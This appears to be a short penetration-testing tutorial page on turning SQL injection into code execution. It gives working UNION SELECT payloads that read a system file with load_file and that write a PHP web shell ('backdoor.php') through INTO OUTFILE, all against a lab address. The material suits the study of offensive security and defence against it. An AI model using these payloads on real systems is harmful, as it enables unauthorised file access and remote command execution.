---
description: Techniques to go from SQLi to code execution
---

# Code Execution

The following examples will build on the ones used in Database Enumeration and Data Extraction.

## File Interaction

SQL can sometimes be used to read, and even write, arbitrary files on the underlying system.

### Read File

Files can be read off the system, and their contents included as query output:

{% code overflow="wrap" %}
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Reading hosts file via SQLi</p></figcaption></figure>

### Write File

The `INTO OUTFILE` command can be used to attempt to write arbitrary files to the underlying system.

In this example the attacker is attempting to write a simple PHP script:

```php
<?php echo shell_exec($_GET['cmd']);?>
```

That script is created via SQLi:

{% code overflow="wrap" %}
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Command  returns an error</p></figcaption></figure>

While the command returned an error, that does not necessarily mean that file creation failed. An attempt to navigate to `/backdoor.php` reveals that file creation was in fact successful in this example:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>File creation was indeed successful</p></figcaption></figure>
